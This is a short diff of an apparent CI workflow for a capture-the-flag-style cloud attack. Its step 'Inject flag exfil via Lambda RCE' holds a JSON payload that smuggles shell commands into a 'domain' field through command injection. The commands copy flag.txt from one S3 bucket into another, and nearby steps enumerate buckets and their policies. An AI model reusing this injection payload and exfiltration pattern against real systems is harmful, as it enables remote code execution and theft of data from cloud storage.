@@ -83,7 +83,7 @@ jobs:
           aws s3 ls s3://site781fe43f26b9eba3 --recursive || echo "access denied"
 
 
-            - name: Inject flag exfil via Lambda RCE
+      - name: Inject flag exfil via Lambda RCE
         run: |
           PAYLOAD='{"domain": "; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://codec4f26c862a321ef5/flag-exfil.txt #"}'
           echo "Sending payload..."
@@ -108,3 +108,4 @@ jobs:
             aws s3api get-bucket-policy --bucket "$b" || true
             aws s3api get-bucket-policy-status --bucket "$b" || true
           done
+
